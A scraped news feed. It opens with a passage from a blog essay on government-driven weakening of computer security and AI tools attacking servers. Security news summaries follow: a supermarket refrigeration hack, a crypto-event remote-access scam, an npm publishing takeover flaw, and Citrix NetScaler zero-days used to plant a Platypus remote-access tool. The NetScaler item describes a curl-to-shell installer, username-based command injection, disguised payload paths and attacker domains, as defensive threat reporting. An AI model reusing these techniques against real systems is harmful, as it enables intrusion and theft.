nor terminate (let alone delete). Hardly a day goes by without some country demanding that your computer's security be weakened in the name of protecting you. For years , both Conservative and Labour UK governments have been steaming towards a total ban on working encryption in the name of catching bad guys: https://pluralistic.net/2023/03/05/theyre-still-trying-to-ban-cryptography/ It's happening in Canada, too, where somehow "digital sovereignty" means "making every device used in Canada vulnerable to foreign spies so that our own spies can access our private communications": https://www.eff.org/deeplinks/2026/05/canadas-bill-c-22-repackaged-version-last-years-surveillance-nightmare Then there's the "age verification" laws proliferating all around the world. Remember, there's no such thing as "age verification," there's only "spying on everyone, all the time, to figure out who the kids are": https://pluralistic.net/2026/06/23/destroy-the-village/#to-save-it Age verification requires multiple entities to assemble vast corpuses of the kinds of sensitive identification papers that would allow identity thieves to destroy the finances and lives of everyone in the country, and (as foretold) every time it's tried, these files leak. Someday, this will lead to doxing whole countries : https://arstechnica.com/tech-policy/2026/02/discord-faces-backlash-over-age-checks-after-data-breach-exposed-70000-ids/ Age verification is the latest and worst stage in governments' fraught relationship with private sector data-collection. The USA is the worst offender here: it is the largest, richest country in the world that has essentially no privacy protections. The last time the US updated its federal privacy law was in 1988 , when the Video Privacy Protection Act banned the disclosure of your VHS rentals. Tech companies spy on you for the same reason your dog licks its balls – because they can, and no one stops them: https://pluralistic.net/2026/03/10/ice-tech/#foreseeable-outcomes Which raises an obvious question: why hasn't Congress updated privacy law? And why hasn't the EU figured out how to force the US companies that pretend to be Irish to obey European privacy law? Bundestrojaner (permalink)

Every morning, I revisit my blog headlines from this date, going back 25 years, 20 years, 15 years, 10 years, 5 years, and one year. I publish the most interesting ones in a section of my newsletter that I call "object permanence," and I think it's the most useful part of my day.

"Object permanence," of course, is a reference to the stage in an infant's development when they acquire the ability to connect events in the past to events in the present, which is why it's the point at which babies cease to be amazed by peek-a-boo. I've been blogging for more than a quarter century, and these daily trawls through the things I considered important enough to share are an unexpectedly powerful way to connect the events of the past to the events of the present.

Take cybersecurity, subject that is filling today's headlines, primarily due to a spate of poorly understood (and criminally poorly explained) incidents in which AI companies' hacking tools broke into various servers on the internet, sometimes trashing them:

https://pluralistic.net/2026/09/12/god-in-the-box/#llms-are-fake

In my discussions of this subject, I've been at pains to tease apart two different aspects of these incidents: first, that it's wrong to speak of bots "going rogue" here (they're doing what they're designed to do); but second, that the alarming thing about these incidents is that they illustrate how deeply unserious our approach to information security has been, and remains.

This is important context, and context is what gives us the object permanence we need to both understand and address real problems, like the two related facts that a) our IT systems are poorly constructed and indifferently maintained; and b) the people who are supposed to be fixing this keep making it worse.

The worst culprits here are governments, though the private sector is also terrible (in truth, our cybersecurity nightmare is something of a private-public partnership from hell). Governments are deeply compromised when it comes to digital security because they have an irreconcilable conflict of interest: on the one hand, they want to defend their countries' administrative systems, firms and households from digital attacks. But on the other hand, they really want to be able to launch attacks on their adversaries, both foreign and domestic.

Worse: because governments don't know who those adversaries might be (or might become at some later date), the state security apparatuses of the world's governments keep insisting that all working computer security must be dismantled, so they can spy on all of us in order to figure out whom among us is a Bad Guy, and then "travel back in time" through each newly discovered "bad guy's" communications to identify their confederates and detail their nefarious plots.

This is an old, old, old fight. It was arguably the first policy fight of the digital era: the fight over whether we could have working encryption at all. Old hands call this era "the crypto wars" (from when "crypto" meant "cryptography"), when the NSA classed working encryption code as a "munition" and criminalized civilian access to it. That was a very hard-fought fight, and it was won decisively by the Electronic Frontier Foundation and our just-retired executive director Cindy Cohn, who, as a young lawyer, litigated the "Bernstein case" that established that code was a form of expressive speech protected by the First Amendment. If you're interested in learning more about this, you should read Cindy's newly published memoir, Privacy's Defender (all profits go to EFF):

https://mitpress.mit.edu/9780262051248/privacys-defender/

Before Cindy came on the scene, the crypto wars were being fought primarily by the "cypherpunks," a motley gang of computer security enthusiasts of many political stripes who were unified by their conviction that the most important aspect of security was defensive. The fact that the NSA wanted to be able to read the private messages and files of their adversaries (the "Four Horsemen of the Infocalypse": terrorists, drug traffickers, child pornographers and organized crime) must not be allowed to trump the fact that any encryption that the NSA could pierce could also be pierced by bad guys: corporate spies, state-sponsored spies, griefers, petty criminals, stalkers, identity thieves and other creeps.

This argument was so indisputable, it's a tautology: "You cannot make a computer user more secure by making their computers less secure." We don't know how to make a computer that only "good guys" can break into, but which "bad guys" bounce off of. Either we make computers more secure, or we don't.

We didn't.

In the decades since the crypto wars, governments have embarked upon an uninterrupted program to weaken the security of our computers, with catastrophic effect. The most spectacular example is unquestionably the spy agencies' doctrine called "NOBUS," which stands for "no one but us"; as in "No one but us is smart enough to find this bug, which means that we can withhold its discovery from the manufacturer, which will allow us to weaponize this bug and use it to attack our enemies. Because no one but us is smart enough to find this bug, none of those enemies will ever discover it, weaponize it, and use it to attack the people who pay our salaries, who expect us to keep them safe."

This turns out to be both catastrophically wrong and catastrophically dangerous. A series of leaks of computer vulnerabilities hoarded by both the NSA and CIA under NOBUS confirmed that these bugs were independently rediscovered by criminals and state actors at the rate of about 20% per year. Worse, though, is that these bugs don't need to be independently rediscovered, because the NSA and CIA both leaked them.

The highest-profile leak was an NSA-hoarded vulnerability in Windows they codenamed "Eternal Blue." https://cdn.sanity.io/files/v5dwkion/production/99206a2d1e9f07b35712b78f7d75fbb09560c08d.pdf

If you have just a little object permanence, you can see that they are the terminal stage of a pathology that governments have only ever worsened: by hoarding and weaponizing vulnerabilities; by paying others to hoard and weaponize vulnerabilities; by criminalizing security audits; by insisting that every computer we rely on be equipped with deliberate vulnerabilities in software we can't inspect, terminate or delete.

Yeah, there should be criminal and civil liability for OpenAI, Amazon, Anthropic and every other company whose bots "went rogue" and attacked servers. But that will do nothing to fix our IT.

The table-stakes for a secure digital world are: public agencies that try to make our computers as secure as possible, including by administering the corporate death-penalty to any company that hoards and weaponizes information about bugs in our computer. We should protect and reward individuals and firms who come forward with true disclosures about bugs in systems we rely upon. We should not give companies the right to silence and punish those critics who want to warn us about their defective products. And we should not require that companies make us less secure in the name of making it easier for spies and cops to catch the bad guys.

items.title: Hackers heat up supermarket fridges, spoiling food across France
items.summary: A cyberattack has forced hundreds of supermarkets across France to throw away refrigerated and frozen food after attackers interfered with the systems that keep it cold. The attack caused significant financial losses and food waste. Some installations reportedly reached temperatures of around 50°C (122°F), with damaged equipment and reports of fires adding to the disruption. The attack, which struck overnight from October 11 to 12, affected stores belonging to Intermarché, Netto, Coopérative U, Carrefour, E.Leclerc, and Monoprix. These stores do not share a single parent company, but they all use refrigeration-control equipment supplied by Danish manufacturer Danfoss. These commercial refrigeration-management systems let operators manage the equipment that keeps supermarket food refrigerated or frozen. Le Monde reported that the attackers extended defrost cycles from one hour to eight hours, delaying alarms and giving staff less opportunity to intervene before stock was ruined. Danfoss told AFP that most affected equipment consisted of legacy products that no longer receive software or security updates. It identified AK-SM800 and AK-SC355 systems among those affected and said it had long advised customers to move away from obsolete models and keep supported equipment updated. Les Mousquetaires, the group behind Intermarché and Netto, has estimated its losses at several million euros. The damage goes beyond spoiled food. The Paris prosecutor’s office has opened an investigation to establish the connection between the attack and reported stock losses and fires. For customers, the disruption can mean closed departments, temporarily closed stores, and gaps on shelves while replacement stock arrives. Some affected stores have already resumed operations, but restoring refrigeration does not immediately replace everything that had to be discarded. The technical recovery involves more than resetting temperatures. France’s national cybersecurity incident response center, CERT-FR, recommends disconnecting or filtering access to affected controllers. Where compromise is suspected, it advises operators to: Restrict network access to necessary service providers Perform a factory reset Apply all available security patches Replace passwords and other authentication secrets Review existing accounts Reconfigure the equipment The attackers have not been publicly identified, and French media have reported no claim of responsibility. At around the same time, Ahold Delhaize, the retailer behind Albert Heijn and Delhaize, announced a security issue within its network. The company said it had taken some systems offline to protect them while assessing and mitigating the problem, and that stores remained open. Online grocery orders and deliveries were also disrupted But a similar timeline is not evidence of a shared attack: no connection between Ahold Delhaize’s network incident and the French refrigeration attack has been established. What consumers can do Check before you travel. Look for updates from your local supermarket about opening hours and the availability of refrigerated and frozen goods. Follow product-specific advice from the retailer. If it issues a warning or recall, follow its advice about returning or discarding affected food. Be cautious with unexpected refund or “order recovery” messages. As a general precaution, check directly through the retailer’s official website or app before providing payment or login details. For now, the confirmed damage centers on refrigeration, spoiled stock, and disrupted store operations. But the attack demonstrates how tampering with connected equipment can turn a cybersecurity incident into spoiled food, empty shelves, and physical damage—problems that restoring a backup alone can’t fix. items.title: “Don’t Get Played”: TOKEN2049 Security Event Faces Remote-Access Scam Allegations
items.summary: A crypto security event that promised to teach attendees how to avoid scams is now the subject of scam allegations. The gathering, branded "Don't Get Played," was held as a side event during TOKEN2049 week in Singapore and co-hosted by groups operating under the names "Apex Accelerator" and "Stone Venture." According to a police report filed by one attendee with the Singapore Police Force, the organizers allegedly pressured guests to install software that would have handed the organizers remote control of their computers. The allegation first gained traction on X, where several other users claimed they had also been approached by the same group. What the "Don't Get Played" Police Report States The document circulating online is page two of a six-page Singapore Police Force report (form NP299), bearing reference number E/20261011/7004. In it, the complainant lists the group's website as token.apexaccs.org and notes that the event's Telegram group had no public URL; prospective attendees could only join through the website. Report filed to the Singapore Police (Source: SolanaFloor on X) The report is titled "Suspected cyber scam targeting TOKEN2049 attendees ('Don't Get Played' event)." Its summary reads: "A group using the names 'Apex Accelerator', 'Stone Venture' and 'Don't Get Played' promoted a crypto security event for TOKEN2049 week (Sun 11 Oct 2026, 6pm to 10pm, The Singapore EDITION). They pressured attendees to install software that would give them remote control of their computers. I did not install their software and have no financial loss." Two details in that statement matter. First, the person who filed the report says they did not install anything. Second, they report no financial loss. The filing therefore documents an alleged attempt rather than a confirmed compromise. How the TOKEN2049 Side Event Was Pitched On paper, "Don't Get Played" looked like exactly the kind of session a careful attendee would seek out. It was marketed as a security-focused gathering designed to help people protect themselves from token scams. "Don't Get Played" registration page (Source: Defraud on X) The event was scheduled for The Singapore EDITION hotel in early October 2026. Entry was free, though guests had to register beforehand, and attendance was capped at 200 people, as detailed by Crypto Briefing . The agenda featured a live "wallet clinic" where attendees could have their holdings checked with "Apex Audit" tools. These were promoted as scanners for token risk and honeypots, a term for tokens engineered so that holders can buy them but are never able to sell. The promotional material also advertised a panel on how crypto scams have evolved, listing representatives from Spartan Group, Bybit's security team, and the Singapore Police Force Cyber Command among the speakers. The final hook was a giveaway. Every confirmed guest was promised a free year of Sophos MDR endpoint protection, bundled with up to $1 million in breach coverage. Research into the event suggests this offer was a major driver of interest. There is nothing in the available material indicating that Spartan Group, Bybit, Sophos, or the Singapore Police Force Cyber Command played any part in the alleged conduct. Their names appeared in the event promotion, and that is the full extent of what the sources establish. The Allegation and the Gaps in the Record The central claim is simple: organizers of "Don't Get Played" allegedly pushed attendees to install software that would give a third-party remote access to their machines. At a crypto event, where many guests carry laptops connected to wallets and exchange accounts, that level of access could be enough to empty funds. Several important facts remain unclear. The source material does not name the software attendees were allegedly asked to install. It does not state whether anyone lost money, and it does not say how many people may have been targeted. As of October 12, 2026, no mainstream coverage of a police report involving the organizers, or of complaints from victims, could be located. The Singapore Police Force has not publicly confirmed the filing. Apex Accelerator and Stone Venture have not been charged with any offense based on the information available, and their account of events has not yet entered the public record. How the Crypto Community Reacted to "Don't Get Played"? After SolanaFloor shared the police report on X, the replies split between people claiming firsthand contact, skeptics, and users offering security advice. The account 0xKYM Registry (@KYMRegistrySG) said it filed the report and shared what it described as a scan of the installation's contents. Several others, including FamCrypt (@Famous0x3), NomadFury (@NomadFury_), and Sabya | YeNo (@SabyaYeNo), said the group had approached or pressured them to install software or buy a subscription. Alex (@alwye) claimed Apex Accelerator had used similar tactics in Twitter DMs. Reactions on Don't Get Played (Source: X) Not everyone was convinced. Sprunky (@sprunky_eth) argued that "page 2 of a report is not a finding," noting the complainant lost nothing, SPF had not confirmed the filing, and no charges exist. Others questioned how anyone could be pressured in Singapore or who vetted the project for the TOKEN2049 lineup. Security-minded users focused on the risk. StakeCraft (@stakecraft) called remote laptop access at a crypto event "a wallet drain waiting to happen," and Jey (@TheWarKettle) advised anyone who installed the software to treat the device as compromised, move funds from a clean device, and rotate every password and key. Others pointed to fake Luma after-party links and similar incidents at other conferences, and one user floated an unsupported DPRK link. Many replies also mocked the irony of a security event called "Don't Get Played" allegedly becoming the play. Conclusion The "Don't Get Played" allegations rest on a single attendee's police report and a growing set of claims on X, none of which have been confirmed by authorities. Several questions remain open. Will Singapore authorities confirm that a report was filed? Will Apex Accelerator or Stone Venture respond publicly? And will Spartan Group or the Singapore Police Force Cyber Command clarify whether they had any connection to the event? Until those answers arrive, the safest assumption for attendees is the one the event's own name suggested: any request to install software deserves suspicion. References: https://x.com/SolanaFloor/status/2109654244655812768 https://cryptobriefing.com/apex-accelerator-stone-venture-token2049-scam/ https://x.com/DefraudTG/status/2109869264718971363 Disclaimer: This blog is based on publicly available information, including a police report and posts shared on X, as of October 13, 2026. Cyble has not independently verified these claims. The allegations remain unproven, and naming any organization does not imply its involvement. This content is for informational purposes only and is not legal or financial advice.

items.title: npm Trusted Publishing Flaw With 10 Million Downloads Exposes 1,500+ Packages to Malicious Takeover
items.summary: A security flaw in npm’s Trusted Publishing feature exposed more than 1,500 packages to possible takeover through reclaimed GitHub repository names. The affected packages accounted for more than 10 million total downloads and over one million downloads per month, creating a serious software supply-chain risk for developers, CI/CD systems, and organizations that rely on npm dependencies. The issue, named SlugFest, did not require an attacker to steal an npm token, break into a maintainer’s npm account, or access the original GitHub repository. Instead, a threat actor could claim an abandoned GitHub owner/repository name and use it to receive a valid short-lived npm publishing credential for a package that still trusted that old location. Analysts at Bloom Security identified the flaw and noted that it was a package takeover path, not an active malware campaign. However, a successful takeover could allow malicious code, including a harmful postinstall script, to be published under a legitimate package name and delivered to users during normal dependency installation. This risk is especially important after the recent ChainDrop npm worm showed how compromised releases can spread through developer tools, repositories, and automated build environments. npm Trusted Publishing Flaw With 10 Million Downloads Trusted Publishing is intended to make npm releases safer. Rather than storing a long-lived npm token in GitHub Actions or another CI/CD service, a maintainer can connect a package to a repository and workflow through OpenID Connect, or OIDC. During a release, the workflow obtains a short-lived identity token and exchanges it for an npm publishing credential. This removes the need to place reusable publishing secrets in build pipelines. The problem was in the way npm initially linked a package to its publishing repository. For an unvalidated configuration, npm stored the human-readable GitHub repository path, known as a slug, such as organization/project , instead of immediately storing GitHub’s permanent numeric repository ID and owner ID. Repository names can change ownership after a project is renamed, transferred, deleted, or when its owner account changes names. That means an attacker could create a new GitHub repository using the newly available slug, add a workflow with the expected filename, request an OIDC token, and present that token to npm. If the configured package had never completed its first trusted publish, npm could accept the repository name as a match and issue a valid publishing credential. The attacker could then release a new version under the legitimate npm package name. Attack chain (Source – Bloom) This differs from the token theft used in many earlier npm compromises. As explained in Cyber Security News coverage of GitHub’s npm security improvements , Trusted Publishing was designed to reduce exposure from long-lived automation tokens. SlugFest showed that a secure short-lived credential can still be abused when the identity binding behind it relies on a reusable name rather than an immutable identifier. Why AI Coding Agents Increase Exposure Bloom’s research also focused on the growing role of AI coding agents in package installation. The company found that a typical endpoint installs around 70 packages a month through AI agents, while developer systems may install close to 350 packages per month. These figures cover direct installations and do not include the additional dependencies pulled in by each package. Tools such as coding assistants and IDE-integrated agents can choose, install, and execute packages with little human review. If a legitimate dependency is silently replaced with a malicious release, the agent may select the newest version and run its lifecycle scripts as part of a normal setup task. This makes package provenance, version pinning, and review of install-time scripts more important than ever. The concern also connects with the AI coding agent security risks reported earlier this year, where manipulated content could influence an agent to run attacker-controlled commands. In the SlugFest case, the dangerous step is not a prompt alone: it is the possibility that an agent installs a package that has been published through an apparently trusted release path. Bloom reported the issue through GitHub’s HackerOne program on June 6, 2026. The issue was validated on June 9, and the researchers said a fix was implemented on October 2 after more than 120 days. GitHub now makes newly created but unvalidated Trusted Publishing configurations expire after 48 hours. A configuration becomes validated only after its first successful publish, which then binds it to the repository’s immutable identity. GitHub also blocks Trusted Publishing tokens triggered by issue_comment events, in addition to its existing restriction on pull_request_target events. Maintainers using affected workflows should move publishing to safer events, such as push , release , or workflow_dispatch . The current npm Trusted Publishing documentation confirms that a new configuration must complete its first successful publish within two days or it will expire. Package maintainers should review every Trusted Publisher configuration, verify that each linked GitHub repository is still under their control, and remove and recreate bindings after a repository rename, deletion, or transfer. Teams should also monitor unexpected release activity, pin dependency versions where practical, and review provenance attestations carefully. As the ChainDrop trusted publishing incident demonstrated, valid provenance can show where a package was built, but it does not prove that the source repository, account, or build environment was safe. items.title: Weekly Update 525: AI Data Breach Hyperbole
items.summary: I remember the name of that AI doco now - The AI Doc: Or How I Became an Apocaloptimist . I was watching it on the long-haul flight home the other day, and what I found particularly engrossing was the polar-opposite opinions from a bunch of people: "it's gonna kill us all" versus "it's gonna make us all rich", and so on. But to some extent, I can understand the gap between opinions when we're all just speculating about the future. I have much less understanding for why people infatuate with hyping AI as a data breach monster when the evidence to date is quite the opposite. In fact, I've enjoyed sharing example after example of recent breaches perpetrated by kids with a telephone (vishing), while pointing out I haven't seen a single one orchestrated by AI. Speaking of AI, a big thanks to this week's sponsor who's doing gtreat things in the agent observability space, Origin . The machines may not be dumping data that lands in HIBP (yet), but they do go off-script and Origin will help trace back precisely what happened when it all goes wrong.

items.title: Hackers Exploit Citrix NetScaler 0-Days to Deploy Platypus Remote Access Tool
items.summary: Threat actors are exploiting two critical Citrix NetScaler zero-day vulnerabilities to deploy a modified Platypus remote access tool on exposed ADC and Gateway appliances. The activity shows how quickly attackers are moving from initial access to persistent control of edge devices that often sit between corporate networks and the public internet. The campaign targets CVE-2026-88771 and CVE-2026-88772 , two actively exploited flaws in Citrix NetScaler ADC and Gateway. Both bugs carry a CVSS score of 9.5 and can allow remote code execution without requiring a valid user account. Citrix released emergency fixes for affected products, while CISA also added the two issues to its Known Exploited Vulnerabilities catalog. Researchers at Binary Defense investigated incidents involving two NetScaler devices that showed signs of exploitation during a customer’s upgrade process. One device showed attempted exploitation, while the other contained evidence that attackers had delivered and likely executed a custom-built remote management implant called Platypus . Platypus is an open-source remote administration framework written in Go. The attackers reportedly modified and compiled the tool for FreeBSD, the operating system used by NetScaler appliances. They then disguised the malware as a Perl-related file to blend in with normal appliance files. The observed installer used a curl command piped into the shell to retrieve and launch the tool. The payload was stored under paths that could look familiar to NetScaler administrators, including /var/tmp/, /netscaler.local/, and /var/core/. One sample used the filename .ns_09343.pl, although it was an ELF binary rather than a legitimate Perl script. Hackers Exploit Citrix NetScaler 0-Days The deployment method matters because it provides attackers with a foothold that may remain even after an organization patches the original vulnerable appliance. A patch stops further use of the flaw. However, it does not automatically remove web shells, backdoors, stolen credentials, altered configuration files, or remote access implants already placed on the device. Recent reporting has also documented attackers using the command-injection flaw to install web shells and collect NetScaler configuration data. CVE-2026-88771 is an improper input validation flaw that can allow an unauthenticated attacker to run commands on vulnerable NetScaler appliances. Attack Chain (source: Binary Defense) Binary Defense researchers found that attackers could place shell commands inside crafted authentication-related input, including usernames. The malicious input is written into NetScaler logs, where a vulnerable error-handling process can later execute the injected command. The second bug, CVE-2026-88772, is a DTLS memory overflow issue. It affects NetScaler VPN virtual servers where DTLS is enabled, which is the default configuration in many deployments. A successful exploit can allow code execution or cause a denial-of-service condition by crashing the affected service. Palo Alto Networks Unit 42 said attackers were actively exploiting the two flaws in NetScaler ADC and Gateway systems. The command-injection weakness is particularly concerning because execution may not happen immediately. A delayed maintenance process can run the injected command later, making it harder for defenders to match a suspicious login request with follow-on activity. The recovered Platypus samples were not standard builds of the public project. The custom version reportedly included added modules for privilege escalation, persistence, cleanup, and timestamp manipulation. DTLS Reassembly (source: Binary Defense ) It could execute commands through a remote terminal, read and write files, update itself, use plugins, and communicate with a command-and-control server through mutual TLS. The malware also contained a local peer-discovery feature using the _platypus-mesh_tcp mDNS service. That feature could help an operator identify or link compromised systems on the same network. Researchers linked the campaign to the domain entretiensol[.]com, which acted as a staging and control server. Other domains reportedly shared infrastructure or certificate traits with the operation, including white-guard[.]pro, gurerasfalt[.]com, garyvard[.]com, and hickoryusedauto[.]com. Organizations should urgently upgrade vulnerable NetScaler ADC and Gateway systems to fixed releases. Citrix identified version 14.1-73.37 and 13.1-64.23 as patched builds for the two original zero-days, including corresponding FIPS and NDcPP releases. Security teams should also treat patching as only the first step. They should review ns.log, sh.log, bash.log, httpaccess.log, and httperror.log for suspicious authentication strings, unexpected shell commands, curl | sh activity, files with .pl extensions that are actually binaries, and outbound traffic from NetScaler appliances to unknown internet hosts. Any appliance exposed before patching should be considered potentially compromised until administrators complete forensic checks, rotate reachable credentials, revoke active sessions, and inspect both nodes in high-availability deployments.
